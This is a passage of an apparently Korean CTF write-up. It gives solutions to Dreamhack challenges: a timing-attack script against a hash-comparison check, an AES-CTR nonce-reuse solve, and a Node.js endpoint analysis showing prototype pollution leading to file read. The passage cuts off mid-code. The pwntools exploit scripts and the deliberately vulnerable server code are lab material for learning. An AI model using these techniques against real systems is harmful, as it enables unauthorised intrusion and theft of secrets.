class="mi">6</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">253</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">196</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">208</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">dec</span><span class="p">(</span><span class="n">ipt</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ipt</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">))[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
        <span class="n">r0</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">ipt</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="s">'little'</span><span class="p">)</span><span class="o">^</span><span class="mh">0xDEADBEEF</span>
        <span class="n">ipt</span> <span class="o">=</span> <span class="n">ipt</span><span class="p">[:</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="p">((((</span><span class="n">r0</span> <span class="o">&lt;&lt;</span> <span class="p">((</span><span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span><span class="o">%</span><span class="mi">32</span><span class="p">))</span> <span class="o">|</span> <span class="p">(</span><span class="n">r0</span> <span class="o">&gt;&gt;</span> <span class="p">((</span><span class="o">-</span><span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span><span class="o">%</span><span class="mi">32</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span><span class="o">+</span><span class="n">ipt</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">:]</span>
    <span class="k">return</span> <span class="n">ipt</span>

<span class="n">ipt</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
<span class="c1"># ipt = bytes(i^j for i,j in zip(k,key)) # chk function's routine before xor
</span><span class="k">print</span><span class="p">(</span><span class="n">dec</span><span class="p">(</span><span class="n">ipt</span><span class="p">))</span>
</pre></table></code></div></div><h2 id="n-leetcode---misc">N. Leetcode - Misc<a href="#n-leetcode---misc" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>파이썬을 코드에 대한 타이밍 공격이 컨셉인 문제이다.</p><p>주어진 파이썬 파일을 대충 깔끔하게 정리하면 아래와 같다.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="k">while</span> \
    <span class="ow">not</span> <span class="p">(</span><span class="n">k</span> <span class="p">:</span><span class="o">=</span> <span class="n">k</span> <span class="k">if</span> <span class="s">"k"</span> <span class="ow">in</span> <span class="nb">vars</span><span class="p">()</span> <span class="k">else</span> <span class="k">lambda</span> <span class="n">c</span> <span class="p">:</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"functools"</span><span class="p">).</span><span class="nb">reduce</span><span class="p">(</span><span class="k">lambda</span> <span class="n">f</span><span class="p">,</span> <span class="n">g</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">f</span><span class="p">(</span><span class="n">g</span><span class="p">(</span><span class="n">f</span><span class="p">(</span><span class="n">x</span><span class="p">))),</span> <span class="p">[</span><span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"hashlib"</span><span class="p">).</span><span class="n">sha512</span><span class="p">(</span><span class="n">x</span><span class="p">).</span><span class="n">digest</span><span class="p">()]</span> <span class="o">*</span> <span class="mi">16</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">)(</span><span class="n">c</span><span class="p">))</span> <span class="ow">or</span>\
    <span class="ow">not</span> <span class="p">(</span><span class="n">s</span> <span class="p">:</span><span class="o">=</span> <span class="n">s</span> <span class="k">if</span> <span class="s">"s"</span> <span class="ow">in</span> <span class="nb">vars</span><span class="p">()</span> <span class="k">else</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"secret"</span><span class="p">).</span><span class="n">s</span><span class="p">.</span><span class="nb">hex</span><span class="p">())</span> <span class="ow">or</span>\
    <span class="ow">not</span> <span class="p">(</span><span class="n">i</span> <span class="p">:</span><span class="o">=</span> <span class="nb">input</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span> <span class="ow">or</span>\
    <span class="nb">any</span><span class="p">(</span><span class="nb">any</span><span class="p">(</span><span class="n">k</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">!=</span> <span class="n">k</span><span class="p">(</span><span class="n">y</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">4</span> <span class="o">*</span> <span class="n">t</span><span class="p">:</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">t</span> <span class="o">+</span> <span class="mi">4</span><span class="p">],</span> <span class="n">i</span><span class="p">[</span><span class="mi">4</span> <span class="o">*</span> <span class="n">t</span><span class="p">:</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">t</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]))</span> <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">__import__</span><span class="p">(</span><span class="s">"random"</span><span class="p">).</span><span class="n">sample</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="mi">4</span><span class="p">))</span> <span class="ow">or</span>\
    <span class="k">print</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">"flag"</span><span class="p">).</span><span class="n">read</span><span class="p">()):</span> 
    
    <span class="k">print</span><span class="p">(</span><span class="s">"🤔"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
</pre></table></code></div></div><p>16바이트의 입력을 받고 해당 입력을 4바이트씩 블록으로 쪼갠 후,<br /> 랜덤한 순서의 블록들을 앞에서부터 순차적으로 <code class="language-plaintext highlighter-rouge">secret.hex()</code>의 동일한 인덱스와 비교한다.</p><p>이때 비교를 위해 사용되는 k함수를 호출하면 무수히 많은 sha512의 요청이 쏟아지고<br /> python은 각 바이트를 비교하는 데에 꽤 많은 시간이 걸린다.</p><p>따라서 입력을 날렸을 때 아웃풋이 돌아오기까지<br /> “좀 오래 걸리는 거 같은데?”<br /> 라는 생각이 들면 맞는 입력을 날린 것이다.</p><p>그래서 자동으로 입력을 만들고, 응답시간을 기반으로 맞는 것 같은 문자를 골라주는 스크립트를 작성하려고 했지만<br /> 응답시간을 결정하는 변수가 너무 많았기 떄문에, 이를 정교하게 만드는 것이 어려워 응답시간을 뿌려주고 직접 눈으로 보고 결정할 수 있게끔 스크립트를 작성하였다.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>
<span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'host1.dreamhack.games'</span><span class="p">,</span> <span class="mi">9347</span><span class="p">)</span>
<span class="c1"># p = process(['python3', '-u', './chal.py'])
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">''</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>

<span class="n">r</span> <span class="o">=</span> <span class="s">''</span>
<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
    <span class="n">u</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">(</span><span class="s">'0123456789abcdef'</span><span class="p">[:]):</span>
        <span class="n">g</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
            <span class="n">pay</span> <span class="o">=</span> <span class="p">(</span><span class="n">r</span><span class="o">+</span><span class="n">i</span><span class="p">)[:</span><span class="mi">4</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
            <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
            <span class="n">a</span> <span class="o">=</span> <span class="n">time</span><span class="p">()</span>
            <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
            <span class="n">b</span> <span class="o">=</span> <span class="n">time</span><span class="p">()</span>
            <span class="n">g</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">b</span> <span class="o">-</span> <span class="n">a</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="nb">sorted</span><span class="p">(</span><span class="n">g</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:],</span><span class="n">i</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>가장 처음 스크립트를 돌릴 때엔<br /> 다른 문자들 대비 응답 시간이 균일하지 않은 문자 4개가 존재한다.</p><p>이는 해당 문자들을 비교했을 때 통과가 되어<br /> 다음 바이트에 대한 비교가 이루어졌기 때문에 응답시간의 차이가 발생한 것으로 볼 수 있다.<br /> 따라서 해당 4개의 문자가 각 블록의 첫번째 글자가 된다.</p><p>이후 각 블록의 첫번째 글자를 r에 넣어 실행한다.</p><p>이때, 랜덤한 비교 순서 때문에<br /> 입력으로 보낸 문자열이 포함된 블록이 <code class="language-plaintext highlighter-rouge">비교되지 않고 끝난 것 같아보이는 시간</code> 과<br /> 입력으로 보낸 문자열이 포함된 블록이 <code class="language-plaintext highlighter-rouge">비교되고 끝난 것 같아보이는 시간</code>의 차가<br /> 여러 변수를 고려하고도 다른 문자 대비 큰 문자 하나가 존재한다.</p><p>해당 문자 역시 최초 실행과 같은 이유로 올바른 문자라고 생각하여 r 뒤에 추가한다.</p><p>위 과정을 반복하면 각각의 블록들을 구할 수 있다.<br /> 이후 블록들의 순서를 적당히 알아내면 플래그를 휙득할 수 있다.</p><h2 id="o-interchange---crypto">O. Interchange - Crypto<a href="#o-interchange---crypto" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>운용방식 별 AES cipher 3개가 주어지고, 원하는 방식에 encrypt 요청을 보낼 수 있는 문제이다.</p><p>CTR로 encrypt를 할 때, 암호화를 할 때마다 동일한 iv를 갖는 cipher를 계속 생성하기 때문에<br /> 아주 긴 <code class="language-plaintext highlighter-rouge">\x00</code>을 암호화 한 값과 플래그를 암호화 한 값을 xor하여 플래그를 휙득하였다.</p><blockquote><p>Solution Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'host1.dreamhack.games'</span><span class="p">,</span> <span class="mi">8930</span><span class="p">)</span>
<span class="c1"># p = process(['python3','-u','chal.py'])
</span>
<span class="k">while</span> <span class="ow">not</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">endswith</span><span class="p">(</span><span class="sa">b</span><span class="s">'CTR'</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x1000</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
<span class="n">x</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">())</span>

<span class="k">print</span><span class="p">(</span><span class="n">xor</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">key</span><span class="p">)[:])</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="q-nss---web">Q. NSS - Web<a href="#q-nss---web" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>프로토타입 폴루션을 통해 LFI로 연결시키는 컨셉의 문제이다.</p><p>개인적으로 오랜만에 재미있게 푼 웹 문제인 것 같다.</p><p>우선 서버에는 크게 세 가지의 객체가 존재한다.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>Users = {}
Users[userid] = {
    userid : "{userid}",
    pass : "{hashed password}",
    workspaces : WORKSPACES,
    base_dir: "{unique tmp path}"
}

WORKSPACES = {}
WORKSPACES[workspace_name] = {}

tokens = {}
tokens[token] = {
    owner: "{userid}",
    expire: EXPIRE_TIME
}
</pre></table></code></div></div><p>그리고 endpoint 중에 아래와 같은 동작을 수행하는 것이 있다.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users/:userid/:ws</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">ws_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">ws</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">token</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">f_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file_name</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">f_path</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file_path</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\.</span><span class="sr">/g</span><span class="p">,</span><span class="dl">''</span><span class="p">)</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">f_content</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file_content</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">token</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid id or token</span><span class="dl">"</span><span class="p">});</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>

    <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ws_name</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid workspace name</span><span class="dl">"</span><span class="p">});</span>

    <span class="kd">const</span> <span class="nx">workspace</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">workspaces</span><span class="p">[</span><span class="nx">ws_name</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">workspace</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find workspace</span><span class="dl">"</span><span class="p">});</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f_name</span> <span class="o">||</span> <span class="o">!</span><span class="nx">f_path</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid file name or path</span><span class="dl">"</span><span class="p">});</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">write_b64_file</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">base_dir</span><span class="p">,</span> <span class="nx">f_path</span><span class="p">),</span> <span class="nx">f_content</span><span class="p">))</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Internal server error</span><span class="dl">"</span><span class="p">});</span>

    <span class="nx">workspace</span><span class="p">[</span><span class="nx">f_name</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f_path</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
<span class="p">});</span>
</pre></table></code></div></div><p>함수의 내용을 요약해서 <code class="language-plaintext highlighter-rouge">users[userid].workspaces[ws_name][f_name]</code>에 원하는 문자열을 넣을 수 있다.<br /> 이 때, ws_name을 검증하지 않으므로 <code class="language-plaintext highlighter-rouge">workspace['__proto__'][f_name]</code>형태로 만들 수 있다.<br /> 따라서 해당 함수에서 prototype pollution이 발생한다.</p><p>PP를 이용해서 이뤄야할 목표는 아래 함수를 통해 <code class="language-plaintext highlighter-rouge">/usr/src/app/flag</code>를 읽는 것이다.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users/:userid/:ws/:fname</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">ws_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">ws</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">f_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">fname</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">token</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">token</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid userid or token</span><span class="dl">"</span><span class="p">});</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>

    <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ws_name</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid workspace name</span><span class="dl">"</span><span class="p">});</span>
    
    <span class="kd">const</span> <span class="nx">workspace</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">workspaces</span><span class="p">[</span><span class="nx">ws_name</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">workspace</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find workspace</span><span class="dl">"</span><span class="p">});</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f_name</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid file name</span><span class="dl">"</span><span class="p">});</span>

    <span class="kd">const</span> <span class="nx">f_path</span> <span class="o">=</span> <span class="nx">workspace</span><span class="p">[</span><span class="nx">f_name</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f_path</span><span class="p">)</span>
